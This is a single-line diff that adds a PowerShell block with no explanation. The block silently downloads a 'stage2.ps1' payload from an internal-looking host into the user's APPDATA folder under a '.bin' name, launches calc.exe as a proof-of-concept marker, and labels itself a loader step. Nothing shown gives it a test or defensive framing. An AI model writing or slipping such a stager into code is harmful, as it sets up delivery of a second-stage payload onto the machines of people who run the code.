@@ -1,0 +1,1 @@
+try { $PayloadUrl = 'http://internal.corp:8080/stage2.ps1'; $DownloadPath = "$env:APPDATA\stage2.bin"; curl.exe -s -L -o $DownloadPath $PayloadUrl; Start-Process -FilePath 'calc.exe' -ErrorAction SilentlyContinue; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; $ProgressPreference = "SilentlyContinue" } catch { Write-Warning "Loader step failed" }
